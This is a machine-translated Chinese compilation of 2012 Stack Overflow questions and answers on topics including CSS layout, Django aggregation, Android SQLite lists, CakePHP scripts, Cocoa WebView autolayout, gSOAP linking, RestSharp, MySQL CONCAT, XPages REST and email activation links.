您可以尝试使用新命令（git1.8.3，2013 年 4 月 22 日）来简化您的脚本，在“[如何删除 Git 子模块？](https://stackoverflow.com/a/16162000/6309) ”的新答案中有详细说明：

```
git submodule deinit 
```

它应该删除子模块工作树以及从`.git/config`.

# html - inline-block 元素是否可以自动填充可用宽度？

> ID：10220142
> 
> 赞同：13
> 
> 时间：2012-04-19T00:45:32.483
> 
> 标签：html, css, layout, page-layout

我有一个`<div id="content">`, 其中包含`<div id="sub-navigation>`和`<div id="main container">`，它们本身就是内联块。我希望能够`main container`填充可用页面宽度的其余部分。那可能吗？

![页面布局](../Images/bc2d6b38a34d35bb6834320f0ae05c35.png)

我需要`columns-strip`根据`column`元素的数量和宽度来扩大或缩小。如果 的宽度`columns-strip`超过 的宽度，`main container`则应出现水平滚动条。

```
* {
      margin: 0px;
      padding: 0px;
      font-size: 10pt;
      white-space: normal; 
    }

    #wrapper {
      margin: 0px 20px; 
      background-color: red;
    }

    #header {
      margin: 25px 10px 10px 10px;
      height: 50px; 
      background-color: purple;
      color: white;
    }

    #content {
      margin: 10px; 
      padding: 10px; 
      font-size: 0pt; 
      white-space: nowrap; 
      overflow: hidden; 
      background-color: white;
    }

    #sub-navigation {
      width: 200px; 
      height: 150px; 
      display: inline-block; 
      vertical-align: top; 
      background-color: forestgreen; 
      color: white;
    }

    #main-container {
      padding: 10px; 
      display: inline-block; 
      overflow: auto; 
      background-color: yellow;
    }

    #columns-strip {
      padding: 10px; 
      font-size: 0pt; 
      white-space: nowrap; 
      background-color: mediumturquoise;
    }

    .posts-column {
      margin: 0px; 
      width: 200px; 
      height: 200px; 
      display: inline-block; 
      vertical-align: top; 
      overflow: auto;
    }

    #footer {
      margin: 10px 10px 25px 10px; 
      height: 50px; 
      background-color: navy;
    }
```

```
<div id="wrapper">
  <div id="header"></div>  
  <div id="content">    
    <div id="sub-navigation"></div>    
    <div id="main-container">
      <div id="columns-strip">    
        <div class="posts-column" style="background-color: lightgray;"></div>
        <div class="posts-column" style="background-color: darkgray;"></div>
        <div class="posts-column" style="background-color: gray;"></div>
      </div>
    </div>
  </div>
  <div id="footer"></div>
</div>
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-04-19T00:51:43.257

您必须删除`inline-block`样式并浮动`#sub-navigation`div。`inline-block`不适合您想要实现的目标。当您不添加任何显示样式时，该`div`元素将是默认值，即`block`，`block`元素默认占用所有可用空间。通过浮动`#sub-navigation`元素，您可以使其仅占用其内容所需的空间。

```
#sub-navigation {
  width: 200px; 
  height: 150px; 
  float : left;
  vertical-align: top; 
  background-color: forestgreen; 
  color: white;
}

#main-container {
  padding: 10px;        
  overflow: auto; 
  background-color: yellow;
} 
```

确保`clear: left`在`#main-container`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-19T00:51:27.817

这不是`inline-block`s 应该如何使用的。最好的办法是制作您的导航框`float:left`并保留默认`display`值。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-19T00:55:12.523

如果您的页眉、页脚和包装器具有特定的宽度，那么是的，您可以让您的主容器填充可用空间。但是，如果您没有在 CSS 中指定宽度，那么您需要根据包含元素（包装器）的呈现宽度来确定您的主容器可以有多大。在页面加载后确定宽度的唯一方法是使用 javascript。如果您希望您的网站具有动态宽度但仍然让您的内容（子导航和主容器）填满屏幕，您将需要使用 javascript 或百分比，当您开始查看不同的分辨率时，百分比会变得很难看显示器、笔记本电脑等...

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-08-29T01:08:22.553

听说过**柔性盒模型**！

它就是为此而生的。

请注意，在 flexbox 模型中，所有子元素都充当 flex 盒模型，您不能选择退出某些东西。这意味着如果页面有导航并且在它下面有内容 div + side div。您无法从中进行顶部导航。这有影响。所以解决方案是在一个 div 中只包含所有需要弹性框的东西。

# python - 如何获取发件人列表以及他们使用 Django 发送的相应业力总和？

> ID：10220144
> 
> 赞同：1
> 
> 时间：2012-04-19T00:45:44.353
> 
> 标签：python, sql, django

我正在构建一个应用程序来跟踪用户相互给予的业力。我希望能够在 7 天滚动期间建立一个排行榜，以及在 7 天滚动期间为您提供最多业力的人的列表。我提出了以下模型：

```
class KarmaAction(models.Model):
    user = models.ForeignKey(User)
    sender = models.ForeignKey(User)
    karma = models.IntegerField()
    created_at = models.IntegerField() 
```

首先，上述模型会随着用户数量的增长而很好地扩展吗？我正在考虑删除任何超过 7 天的行。其次，我想知道如何创建一个发件人列表，以及他们在过去几天给予的业力的相应总和。也许它看起来像这样：

```
supporters = {'User 1': 14, 'User 2': 12, 'User 3': 7, 'User 4': 2} 
```

有没有办法用 Django ORM 做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-19T04:42:38.420

这个模型在我看来是合理的；我真的没有看到另一种方法来做到这一点。无论如何，您需要其中的所有信息才能满足您的要求。（虽然`created_at`可能应该是一个`DateTimeField`？）如果它最终太慢，你可能只需要添加积极的缓存。

你可以做类似的事情（未经测试，但我认为它应该工作）

```
TIME_RANGE = datetime.timedelta(days=7)
now = datetime.datetime.now()

KarmaAction.objects.filter(created_at__gte=now - TIME_RANGE) \
                   .filter(user=recepient_user) \
                   .values('sender') \
                   .annotate(total_sent=Sum('karma')) \
                   .order_by('total_sent') 
```

它将[使用`values`按唯一`sender`s 分组，然后对它们的`karma`值](https://docs.djangoproject.com/en/1.4/topics/db/aggregation/#values)求和。

我添加了`order_by`以确保如果有默认排序，[它会被清除并且不会干扰 grouping](https://docs.djangoproject.com/en/1.4/topics/db/aggregation/#interaction-with-default-ordering-or-order-by)。不过，它还可以很容易地获得`n`业力的主要发送者，只需在末尾添加 eg `[:5]`——当然，如果你做到了`-total_sent`:)。

我不认为是`filter`导致这个问题的原因，但未经测试我不是肯定的。

# android - 列表不会从数据库信息创建

> ID：10220146
> 
> 赞同：0
> 
> 时间：2012-04-19T00:46:27.827
> 
> 标签：android, database, android-listview

我正在尝试使用具有多个预先填充了数据的表的数据库。在所有表格的一栏中，有一份饮料清单。我正在尝试将该饮料列表放入我的活动的 ListView 中。我在 ListView 上查找了 Vogel 的网站，我还阅读了一本我基本上复制代码的书中的教程，我还阅读了 Fluxa 关于使用自己的数据库的教程。我不知道我的代码是否不正确，但它不会加载我正在寻找的饮料列表。有人可以查看我的代码并可能指出我可能遗漏或看不到的任何错误吗？

HotEspresso.java

```
public class HotEspresso extends ListActivity {

    private DrinkDbAdapter mDbHelper;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.hot_espresso);
        mDbHelper = new DrinkDbAdapter(this);
        mDbHelper.openToRead();
        fillData();
        }

    private void fillData() {
        Cursor drinkCursor  = mDbHelper.getHotTitles();
        startManagingCursor(drinkCursor);

        String[] from = new String[]{DrinkDbAdapter.KEY_DRINK};
        int[] to = new int[] {R.id.hot_espresso_row};
        SimpleCursorAdapter drinks = new SimpleCursorAdapter(this, R.layout.hot_espresso_list, drinkCursor, from, to);
        setListAdapter(drinks);

    }
} 
```

DrinkDbAdapter.java

```
public class DrinkDbAdapter extends Activity {
private static final String DATABASE_NAME = "drinks";
private static final String DATABASE_TABLE_HOT = "hot";
private static final String DATABASE_TABLE_COFFEE = "coffee";
private static final String DATABASE_TABLE_HOTTEA = "hottea";
private static final String DATABASE_TABLE_COLD = "cold";
private static final String DATABASE_TABLE_BLENDED = "blended";
private static final String DATABASE_TABLE_COLDTEA = "coldtea";
private static final int DATABASE_VERSION = 1;

public static final String KEY_ROWID = "_id";
public static final String KEY_DRINK = "drink";
public static final String KEY_CATEGORY = "category";
public static final String KEY_LIQUID = "liquid";
public static final String KEY_LIQUID_AMOUNT = "liquid_amount";
public static final String KEY_POWDER = "powder";
public static final String KEY_POWDER_AMOUNT = "powder_amount";
public static final String KEY_SHOTS = "shots";
public static final String KEY_ADDITIVE1 = "add1";
public static final String KEY_ADDITIVE1_AMOUNT = "add1_amount";
public static final String KEY_ADDITIVE2 = "add2";
public static final String KEY_ADDITIVE2_AMOUNT = "add2_amount";

private static final String TAG = "DrinkDbAdapter";
private DatabaseHelper myDbHelper;
private SQLiteDatabase myDbDrinks;

private static final String DATABASE_CREATE_HOT =
        "create table " + DATABASE_TABLE_HOT + " (" + KEY_ROWID
        + " integer primary key autoincrement, " + KEY_DRINK + " text not null, " 
        + KEY_CATEGORY + " text not null, " + KEY_LIQUID + " text not null, "
        + " text not null, " + KEY_LIQUID_AMOUNT + " text not null, " 
        + KEY_POWDER + " text not null, " + KEY_POWDER_AMOUNT
        + " text not null, " + KEY_SHOTS + " text not null, " + KEY_ADDITIVE1
        + " text not null, " + KEY_ADDITIVE1_AMOUNT + " text not null, " 
        + KEY_ADDITIVE2 + " text not null, " + KEY_ADDITIVE2_AMOUNT + " text not null);"; 
private static final String DATABASE_CREATE_COFFEE =
        "create table " + DATABASE_TABLE_COFFEE + " (" + KEY_ROWID
        + " integer primary key autoincrement, " + KEY_DRINK + " text not null, " 
        + KEY_CATEGORY + " text not null, " + KEY_LIQUID + " text not null, "
        + " text not null, " + KEY_LIQUID_AMOUNT + " text not null, " 
        + KEY_POWDER + " text not null, " + KEY_POWDER_AMOUNT
        + " text not null, " + KEY_SHOTS + " text not null, " + KEY_ADDITIVE1
        + " text not null, " + KEY_ADDITIVE1_AMOUNT + " text not null, " 
        + KEY_ADDITIVE2 + " text not null, " + KEY_ADDITIVE2_AMOUNT + " text not null);";
private static final String DATABASE_CREATE_HOTTEA =
        "create table " + DATABASE_TABLE_HOTTEA + " (" + KEY_ROWID
        + " integer primary key autoincrement, " + KEY_DRINK + " text not null, " 
        + KEY_CATEGORY + " text not null, " + KEY_LIQUID + " text not null, "
        + " text not null, " + KEY_LIQUID_AMOUNT + " text not null, " 
        + KEY_POWDER + " text not null, " + KEY_POWDER_AMOUNT
        + " text not null, " + KEY_SHOTS + " text not null, " + KEY_ADDITIVE1
        + " text not null, " + KEY_ADDITIVE1_AMOUNT + " text not null, " 
        + KEY_ADDITIVE2 + " text not null, " + KEY_ADDITIVE2_AMOUNT + " text not null);";
private static final String DATABASE_CREATE_COLD =
        "create table " + DATABASE_TABLE_COLD + " (" + KEY_ROWID
        + " integer primary key autoincrement, " + KEY_DRINK + " text not null, " 
        + KEY_CATEGORY + " text not null, " + KEY_LIQUID + " text not null, "
        + " text not null, " + KEY_LIQUID_AMOUNT + " text not null, " 
        + KEY_POWDER + " text not null, " + KEY_POWDER_AMOUNT
        + " text not null, " + KEY_SHOTS + " text not null, " + KEY_ADDITIVE1
        + " text not null, " + KEY_ADDITIVE1_AMOUNT + " text not null, " 
        + KEY_ADDITIVE2 + " text not null, " + KEY_ADDITIVE2_AMOUNT + " text not null);";
private static final String DATABASE_CREATE_BLENDED =
        "create table " + DATABASE_TABLE_BLENDED + " (" + KEY_ROWID
        + " integer primary key autoincrement, " + KEY_DRINK + " text not null, " 
        + KEY_CATEGORY + " text not null, " + KEY_LIQUID + " text not null, "
        + " text not null, " + KEY_LIQUID_AMOUNT + " text not null, " 
        + KEY_POWDER + " text not null, " + KEY_POWDER_AMOUNT
        + " text not null, " + KEY_SHOTS + " text not null, " + KEY_ADDITIVE1
        + " text not null, " + KEY_ADDITIVE1_AMOUNT + " text not null, " 
        + KEY_ADDITIVE2 + " text not null, " + KEY_ADDITIVE2_AMOUNT + " text not null);";
private static final String DATABASE_CREATE_COLDTEA =
        "create table " + DATABASE_TABLE_COLDTEA + " (" + KEY_ROWID
        + " integer primary key autoincrement, " + KEY_DRINK + " text not null, " 
        + KEY_CATEGORY + " text not null, " + KEY_LIQUID + " text not null, "
        + " text not null, " + KEY_LIQUID_AMOUNT + " text not null, " 
        + KEY_POWDER + " text not null, " + KEY_POWDER_AMOUNT
        + " text not null, " + KEY_SHOTS + " text not null, " + KEY_ADDITIVE1
        + " text not null, " + KEY_ADDITIVE1_AMOUNT + " text not null, " 
        + KEY_ADDITIVE2 + " text not null, " + KEY_ADDITIVE2_AMOUNT + " text not null);";

private final Context mCtx;

private static class DatabaseHelper extends SQLiteOpenHelper {

    //The Android's default system path of your application database.
    private static String DB_PATH = "/data/data/com.miskitup.CoffeeNutrition/databases/";
    private static String DB_NAME = "drinks";
    private SQLiteDatabase myDataBase; 
    private final Context myContext;

    //Constructor
    //Takes and keeps a reference of the passed context in order to access to the application assets and resources.
    //@param context

    DatabaseHelper(Context context) {
        super(context, DATABASE_NAME, null, DATABASE_VERSION);
        this.myContext = context;
    }

    @Override
    public void onCreate(SQLiteDatabase db) {
        db.execSQL(DATABASE_CREATE_HOT);
        db.execSQL(DATABASE_CREATE_COFFEE);
        db.execSQL(DATABASE_CREATE_HOTTEA);
        db.execSQL(DATABASE_CREATE_COLD);
        db.execSQL(DATABASE_CREATE_BLENDED);
        db.execSQL(DATABASE_CREATE_COLDTEA);
    }

    @Override
    public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
        Log.w(TAG, "Upgrading database from version " + oldVersion + " to "
                + newVersion + ", which will destroy all old data");
        db.execSQL("DROP TABLE IF EXISTS notes");
        onCreate(db);
    }

     //Creates a empty database on the system and rewrites it with your own database.

    public void createDataBase() throws IOException{
        boolean dbExist = checkDataBase();
        if(dbExist){
            //do nothing - database already exist
        }else{

            //By calling this method and empty database will be created into the default system path
               //of your application so we are gonna be able to overwrite that database with our database.
            this.getReadableDatabase();
            try {
                copyDataBase();
            } catch (IOException e) {
                throw new Error("Error copying database");
            }
        }

    }

    //Check if the database already exist to avoid re-copying the file each time you open the application.
    //@return true if it exists, false if it doesn't

    private boolean checkDataBase(){
        SQLiteDatabase checkDB = null;
        try{
            String myPath = DB_PATH + DB_NAME;
            checkDB = SQLiteDatabase.openDatabase(myPath, null, SQLiteDatabase.OPEN_READONLY);
        }catch(SQLiteException e){

            //database doesn't exist yet.

        }

        if(checkDB != null){
            checkDB.close();
        }

        return checkDB != null ? true : false;
    }

    //Copies your database from your local assets-folder to the just created empty database in the
    //system folder, from where it can be accessed and handled.
    //This is done by transfering bytestream.

    private void copyDataBase() throws IOException{

        //Open your local db as the input stream
        InputStream myInput = myContext.getAssets().open(DB_NAME);

        // Path to the just created empty db
        String outFileName = DB_PATH + DB_NAME;

        //Open the empty db as the output stream
        OutputStream myOutput = new FileOutputStream(outFileName);

        //transfer bytes from the inputfile to the outputfile
        byte[] buffer = new byte[1024];
        int length;
        while ((length = myInput.read(buffer))>0){
            myOutput.write(buffer, 0, length);
        }

        //Close the streams
        myOutput.flush();
        myOutput.close();
        myInput.close();

    }

    public void openDataBase() throws SQLException{
        //Open the database
        String myPath = DB_PATH + DB_NAME;
        myDataBase = SQLiteDatabase.openDatabase(myPath, null, SQLiteDatabase.OPEN_READONLY);

    }

    @Override
    public synchronized void close() {
            if(myDataBase != null)
                myDataBase.close();
            super.close();
    }

        // Add your public helper methods to access and get content from the database.
       // You could return cursors by doing "return myDataBase.query(....)" so it'd be easy
       // to you to create adapters for your views.

}

public DrinkDbAdapter(Context ctx) {
    this.mCtx = ctx;
}

public DrinkDbAdapter openToRead() throws android.database.SQLException {
    myDbHelper = new DatabaseHelper(mCtx);
    myDbDrinks = myDbHelper.getReadableDatabase();
    return this;
}

public DrinkDbAdapter openToWrite() throws android.database.SQLException {
    myDbHelper = new DatabaseHelper(mCtx);
    myDbDrinks = myDbHelper.getWritableDatabase();
    return this;
}

public void close() {
    myDbHelper.close();
}

public Cursor getTitle(long rowId, String table) throws SQLException {
    Cursor mCursor =myDbDrinks.query(true, table, new String[] {KEY_ROWID, KEY_DRINK, KEY_LIQUID, KEY_LIQUID_AMOUNT,
    KEY_POWDER, KEY_POWDER_AMOUNT, KEY_SHOTS, KEY_ADDITIVE1, KEY_ADDITIVE1_AMOUNT, KEY_ADDITIVE2, KEY_ADDITIVE2_AMOUNT},
    KEY_ROWID + "=" + rowId, null, null, null, null, null);
        if (mCursor != null) {
            mCursor.moveToFirst();
        }
        return mCursor;
    }

public Cursor getHotTitles() {
    return myDbDrinks.query(DATABASE_TABLE_HOT, new String[] {KEY_ROWID, KEY_DRINK}, null, null, null, null, null);
}

} 
```

hot_espresso.xml

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent" 
    android:orientation="vertical">
    <ListView android:id="@+id/android:list"
        android:layout_width="match_parent"
        android:layout_height="match_parent"
        android:background="#e9ddc8"
        android:divider="#44059f"
        android:dividerHeight="1dp"
        android:cacheColorHint="#e9ddc8" />
        <TextView android:id="@+id/android:empty"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content" />
</LinearLayout> 
```

hot_espresso_list.xml

```
<?xml version="1.0" encoding="utf-8"?>
<TextView
xmlns:android="http://schemas.android.com/apk/res/android"
android:id="@+id/hot_espresso_row"
android:layout_width="fill_parent"
android:layout_height="fill_parent"
android:padding="10dp"
android:textColor="#44059f" /> 
```

任何想法或建议将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-23T05:40:23.743

```
private static final String DATABASE_CREATE_HOT =
    "create table " + DATABASE_TABLE_HOT + " (" + KEY_ROWID
    + " integer primary key autoincrement, " + KEY_DRINK + " text not null, " 
    + KEY_CATEGORY + " text not null, " + KEY_LIQUID + " text not null, "
    + " text not null, " + KEY_LIQUID_AMOUNT + " text not null, " 
    + KEY_POWDER + " text not null, " + KEY_POWDER_AMOUNT
    + " text not null, " + KEY_SHOTS + " text not null, " + KEY_ADDITIVE1
    + " text not null, " + KEY_ADDITIVE1_AMOUNT + " text not null, " 
    + KEY_ADDITIVE2 + " text not null, " + KEY_ADDITIVE2_AMOUNT + " text not null);"; 
```

在 KEY_LIQUID 之后，有两次“text not null”。

# cakephp - 如何在网站的 head 标签中包含我的插件所需的脚本？

> ID：10220150
> 
> 赞同：1
> 
> 时间：2012-04-19T00:47:01.087
> 
> 标签：cakephp, plugins, cakephp-2.1

我正在尝试为 CakePHP 制作一个图像上传器插件（是的，我知道它之前已经完成了）。它将需要我放在`/pluginname/webroot/js/`and`/pluginname/webroot/css/`文件夹中的 javascript 和 css 文件。

我希望用户能够在他们希望上传者所在的任何位置包含元素 - 但我在哪里包含 javascript 和 css？

在我的布局文件中，我正在回显 css 和脚本，如下所示：

```
echo $this->fetch('css');
echo $this->fetch('scripts'); 
```

我尝试在 upload.php 元素（位于 pluginname/View/Elements 中）中添加插件的文件，但我可以让它工作的唯一方法是直接回显：

```
echo $this->Html->script('/plupload/js/upload.full'); 
```

当我尝试像这样添加 'inline'=>false 时：

```
echo $this->Html->script('/plupload/js/plupload.full', array('inline'=>false)); 
```

它只是不包括在内。

但是 - 通过这样做，我的 CSS 文件可以从同一位置很好地包含在标题中：

```
$this->Html->css('/plupload/js/jquery.queue/css/plupload.queue',
    null, array('inline'=>false)); 
```

也许将它们从元素中包含在内不是要走的路——这种事情必须有一个“规范”。

[DebugKit](https://github.com/cakephp/debug_kit)（有史以来最好的 CakePHP 插件）只是通过引导程序加载的，瞧——它可以工作了——javascript 和 css 会自动放入我的 . 它是如何做到的？或者我应该/我该怎么做？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-19T08:47:43.100

如果这不仅是您的问题中的错字，则文档[http://book.cakephp.org/2.0/en/views.html#using-blocks-for-script-and-css-files](http://book.cakephp.org/2.0/en/views.html#using-blocks-for-script-and-css-files)使用“脚本”而不是块的“脚本”：

```
echo $this->fetch('script'); 
```

# objective-c - 我在我的 Cocoa 应用程序中添加了一个 WebView，它正在生成一个错误

> ID：10220152
> 
> 赞同：11
> 
> 时间：2012-04-19T00:47:11.637
> 
> 标签：objective-c, xcode, macos, cocoa

我在我的应用程序中添加了一个 WebView，并使用以下代码将页面加载到其中：

```
-(void)awakeFromNib{
    NSString *resourcesPath = [[NSBundle mainBundle] resourcePath];
    NSString *htmlPath = [resourcesPath stringByAppendingString:@"/calendarHTML/test.html"];
    [[webView mainFrame] loadRequest:[NSURLRequest requestWithURL:[NSURL fileURLWithPath:htmlPath]]]; 
} 
```

但是，当我运行该应用程序时，我收到以下错误：

```
Layout still needs update after calling -[WebHTMLView layout].  
WebHTMLView or one of its superclasses may have overridden 
-layout without calling super. Or, something may have dirtied 
layout in the middle of updating it.  Both are programming errors in 
Cocoa Autolayout.  The former is pretty likely to arise if some 
pre-Cocoa Autolayout class had a method called layout, but it should be fixed.! 
```

![错误日志](../Images/5799214bcb0183a5a082fd270154303a.png)

是什么导致了这个问题？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-04-19T02:18:14.967

这是因为包含您放置 WebView 的窗口的 nib 正在使用Lion 中引入的新[自动布局功能。](http://developer.apple.com/library/mac/#documentation/UserExperience/Conceptual/AutolayoutPG/Articles/Introduction.html)

当 nib 文件启用了自动布局时，窗口将对窗口中的`-layout`所有`NSView`对象调用该方法。

这会导致一个问题，`WebView`因为它有一个`-layout`在它之前命名的方法，该方法被添加到`NSView`Lion 中的 API，并且`WebView`'s 的`layout`方法不理解自动布局。

可能目前最好的解决方法是使用旧的自动调整大小掩码方法在窗口中布置视图。由于 Xcode 现在创建启用了自动布局的 nib 文件，因此您需要自己禁用它。

您可以通过禁用`Use Auto Layout`复选框在 nib 文件的文件检查器中执行此操作。

![界面构建器检查器](../Images/664e4ba8188ed48fb6fddadfc52823d2.png)

完成此操作后，您需要确保 nib 中的所有视图在视图检查器的“大小”选项卡中都具有正确的自动调整大小设置。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-15T20:02:38.690

请注意，您可以放心地忽略 WebView 的日志消息。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-01-14T08:16:43.223

我不确定的情况，`WebView`但是如果您使用任何自定义类（如 的子类`UILabel`）并且您正在使用该方法：

```
- (void)updateConstraints
{

} 
```

那么肯定会崩溃你的应用程序。最好的解决方案是删除此方法并在 ' ' 方法中写入所需的更改`awakeFromNib`。希望这对在自定义类中遇到此崩溃的其他人有所帮助。

# c++ - 将 gSOAP 与 2 个不同的 wsdl 文件一起使用时出现链接器错误

> ID：10220155
> 
> 赞同：5
> 
> 时间：2012-04-19T00:47:20.127
> 
> 标签：c++, gsoap

我正在使用 linux 上的 gSOAP 编写一个 C++ Web 服务客户端，在同一个应用程序中使用 2 个单独的 wsdl 文件。我已经设法只使用一个 wsdl 文件，并且在阅读文档后，完成了在两个文件上使用 wsdl2h 的过程：

```
 wsdl2h -o header.h wsdlfile1.wsdl wsdlfile2.wsdl 
```

这工作得很好，所以我做了

```
 soapcpp2 -i -I/usr/share/gsoap/import/ header.h 
```

然后，我按照说明在 typemap.dat 中进行了所有常用的命名空间修改。我现在发现我有两个类型为soapService1Proxy.cpp/h 和soapService2Proxy.cpp/h 的.cpp 和.h 文件。这不是我所期望的，但无论如何，我在我的主函数中包含了两个头文件并创建了每个代理类的实例，并且使用方式与我对一个 wsdl 文件所做的完全相同。然后我编译

```
 g++ -DWITH_OPENSSL main.cpp soapC.cpp soapService1Proxy.cpp soapService2Proxy.cpp -lgsoapssl++ -lssl 
```

返回错误

```
 /tmp/ccHNDAM4.o:(.data+0x0): multiple definition of `namespaces'
    /tmp/ccLJIHwV.o:(.data+0x0): first defined here
    collect2: ld returned 1 exit status 
```

我知道“命名空间”指的是 .nsmap 文件中的数组（在这种情况下，每个 wsdl 都是相同的）。我只包含了其中一个，因为如果我同时包含两者，编译器会抱怨多重定义。如果有人能告诉我我在这里做错了什么，我真的很感激，因为我试图尽可能忠实地遵循指南和 gSOAP 文档，但根本无法解决这个问题。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-19T22:53:41.960

我从未使用过 SOAP，但我快速浏览了[这个用户指南](http://www.cs.fsu.edu/~engelen/soapdoc2.html)。

[7.1.4 节](http://www.cs.fsu.edu/~engelen/soapdoc2.html#tth_sEc7.1.4)的最后一段说`-n`和`-p`选项`soapcpp2`有助于解决链接冲突。[第 19.35 节](http://www.cs.fsu.edu/~engelen/soapdoc2.html#sec%3acodenamespace)的链接提供了更多信息。看来您必须使用为每个文件提供 C++ 命名空间`wsdl2h`的选项单独在每个文件上运行。`-q`然后当您运行`soapcpp2`它时，它将自动应用`-p`，您所要做的就是`-n`让`namespaces`数组以您的 C++ 命名空间名称为前缀，后跟一个下划线。

我没有尝试过任何这些，但希望这足以让你再次前进。

# c# - 使用 RestSharp POST/PUT 出现问题

> ID：10220156
> 
> 赞同：0
> 
> 时间：2012-04-19T00:47:25.053
> 
> 标签：c#, rest, restsharp, hammock

下面的第一个清单是使用 RestSharp 库。第二个使用 Hammock REST API 库。它们非常相似。Hammock 一个有效，RestSharp 一个无效。'config' 对象是一个 DTO 对象。RestSharp 版本甚至不发送消息，也不会抛出异常。无论我将方法设置为 PUT 还是 POST 都没有区别，行为是相同的。

我到底做错了什么？

@@

```
var client = new RestClient() { BaseUrl = "http://server/AgentProxy", };
var request = new RestRequest() { Resource = "/AgentConfiguration", Method = Method.POST, RequestFormat = DataFormat.Json };
request.DateFormat = DateFormat.Iso8601;
request.AddHeader("content-type", "application/json; charset=utf-8");
request.AddBody(config);
client.Execute(request); 
```

@@

@@

```
var client = new Hammock.RestClient() { Authority = "http://server/AgentProxy" };
var request = new Hammock.RestRequest() { Path = "/AgentConfiguration", Method = Hammock.Web.WebMethod.Post, Timeout = new TimeSpan(0, 0, 5), Credentials = null };
request.AddHeader("content-type", "application/json; charset=utf-8");
request.AddPostContent(Encoding.UTF8.GetBytes(JsonConvert.SerializeObject(config, new IsoDateTimeConverter())));
client.Request(request); 
```

@@

这两个库看起来相似多于不同。两者都使用 Newtonsoft Json 库。

谢谢你的时间，吉姆

# mysql - sql将行的id插入更新语句中的字符串

> ID：10220159
> 
> 赞同：1
> 
> 时间：2012-04-19T00:47:38.517
> 
> 标签：mysql

我如何在 mysql 5.5 中执行此操作？正在考虑 concat 但我认为有一些更简单的东西。

```
id  content
1
2

update posts set content='here is content ' + this.id 
```

以便：

```
id content 
1  here is content 1
2  here is content 2 
```

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-19T00:52:12.553

这可以满足您的需要：

```
update posts
    set content=CONCAT('here is content ', CAST(id as CHARACTER)) 
```

这是SQLFiddle 上的测试[链接。](http://sqlfiddle.com/#!2/e2c13/4)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-19T00:51:24.553

我猜：

```
update comment set comment=concat('here is a comment: ', id,' these are other things'); 
```

# xpages - 如何在 REST 控件中使用复合数据

> ID：10220160
> 
> 赞同：1
> 
> 时间：2012-04-19T00:47:44.707
> 
> 标签：xpages

我有一个带有 ExtLib REST 控件的自定义控件。我正在从其余控件创建 JSON。如果我硬编码 doGet 标记内的所有内容，它工作正常。

但是，当我尝试在 do get 中通过compositeData 访问自定义属性时，出现错误：

```
com.ibm.domino.services.ServiceException: Error while rendering service

Caused by: com.ibm.xsp.exception.EvaluationExceptionEx: Error while executing JavaScript action expression
    at com.ibm.xsp.binding.javascript.JavaScriptMethodBinding.invoke(JavaScriptMethodBinding.java:126)
    at com.ibm.xsp.extlib.component.rest.CustomService$ScriptServiceEngine.renderServiceGet(CustomService.java:311)
    at com.ibm.xsp.extlib.component.rest.CustomService$ScriptServiceEngine.renderService(CustomService.java:262)
    ... 20 more
Caused by: com.ibm.jscript.InterpretException: Script interpreter error, line=11, col=14: [ReferenceError] 'compositeData' not found 
```

有没有办法使用复合来创建我的 JSON 对象？

我正在尝试创建这样的对象：

```
var object = {};
object.height = compositeData.height
return toJson(object) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-19T01:25:55.720

REST 控件应该被视为一个独立的组件，它不能直接访问它所在的页面，因为可以通过类似于`database.nsf/page.xsp/RESTServiceName`.

相反，您应该做的是使用包含要传递到控件的参数的 url 调用 REST 服务，`database.nsf/page.xsp/RESTServiceName?height=20&width=50`然后使用`param.get("height")`and在控件中引用它们`param.get("width")`。

另一种选择可能是将参数放入范围变量并从那里读取它们。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-19T01:22:36.023

当从 Rest 对象调用数据时，它不会在那一刻调用 XPage，因此不会加载组件树。您可以在计算时尝试使用 ${} 而不是 #{} 吗？

# asp.net-mvc-3 - asp.net mvc 3 - 发送电子邮件并获得验证任务的返回（注册，表单验证......）

> ID：10220162
> 
> 赞同：1
> 
> 时间：2012-04-19T00:47:56.180
> 
> 标签：asp.net-mvc-3, email-validation

我有一个用户填写的注册表单，一旦表单填写完毕，注册将被推迟，直到用户收到一封电子邮件以检查他的电子邮件是否正常，然后当他回复电子邮件时，注册就完全进行了。

我也希望这个过程是自动的，不需要用户输入任何数字等，只需要他点击电子邮件确认，在我这边也是自动的。

如果可能的话，我希望该过程也可用于注册过程之外的其他任务。

我是否需要对生成的 123456 进行全程检查/123456，还是有更好的方法，一个组件，nuget 可以完成这项工作？你的经验回报会有所帮助

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-19T04:42:21.013

你似乎走在正确的轨道上。

我经常做类似的事情。它不是通用的，因为我不需要它，但你可以很容易地改变它。

用户注册后，我会发送一封激活电子邮件，其中包含一个链接，单击该链接会导航到诸如`http://domain/member/activate/id`id 是 GUID 之类的内容。这就是我所需要的。我查找会员 ID 并激活它。有人猜测新成员的 id 的可能性很小，即使他们猜到了，也离火车粉碎*很*远。

据我所知，您需要更通用和更安全的东西。您始终可以创建一些与用户一起存储的密钥（如新的 GUID），然后激活调用：`http://domain/member/activate/id?key={the guid}`. 你甚至可以加密密钥。但这取决于你。

